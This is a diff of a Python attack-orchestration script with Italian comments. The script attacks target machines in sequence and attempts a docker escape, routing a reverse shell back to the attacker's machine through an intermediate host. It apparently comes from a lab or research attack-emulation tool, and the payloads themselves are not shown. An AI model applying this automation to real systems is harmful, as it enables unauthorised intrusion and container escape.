@@ -34,7 +34,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
 
     #CASO 0: PROCEDURA IN ORDINE CASUALE
     if not attack_sequence_file:
-        print(f"{C.COL_YELLOW}\n[*]Attacking with random attack sequence{C.COL_RESET}")
+        print(f"{C.COL_YELLOW}\nAttacking with random attack sequence{C.COL_RESET}")
         
         #Vengono estratte ed attaccate, una ad una, tutte le macchine target
         while machines:
@@ -94,14 +94,15 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
 
                         #Viene fatto port forwarding (il docker escape viene fatto passare per la macchina intermedia che poi apre una reverse shell verso la macchina attaccante) 
                         #Altrimenti, essendo la macchina target e la macchina bersagio in diverse sottoreti, l'attacco non sarebbe possibile
-                            mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
+                            mc.route_flush()
+                            #mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                             docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
-                            escape = mc.docker_escape(docker_escape_attack_object)
-                            if(escape):
+                            docker_escape_success = mc.attempt_attack(docker_escape_attack_object)
+                            if(docker_escape_success):
                                 print(f"{C.COL_GREEN}docker_escape successful!{C.COL_RESET}")
                             else:
                                 print(f"{C.COL_RED}docker_escape failed!{C.COL_RESET}")
-                                break  
+                                break 
 
                         break
                     else:
@@ -120,7 +121,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
 
     #CASO 1: PROCEDURA CON ORDINE LETTO DA FILE
     else:
-        print(f"{C.COL_YELLOW}\nggoReading attack sequence from Attack_sequence.json and attacking with that")
+        print(f"{C.COL_YELLOW}\nReading attack sequence from Attack_sequence.json and attacking with that")
         print(f"{C.COL_YELLOW}ATTACK SEQUENCE:")
         #Viene estratta dal file la sequenza di attacchi da utilizzare durante la procedura
         with open(attack_sequence_file) as f:
@@ -191,9 +192,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                             #mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                             docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
                             docker_escape_success = mc.attempt_attack(docker_escape_attack_object)
-                            print(docker_escape_success)
-                            escape = mc.docker_escape(docker_escape_attack_object)
-                            if(escape):
+                            if(docker_escape_success):
                                 print(f"{C.COL_GREEN}docker_escape successful!{C.COL_RESET}")
                             else:
                                 print(f"{C.COL_RED}docker_escape failed!{C.COL_RESET}")
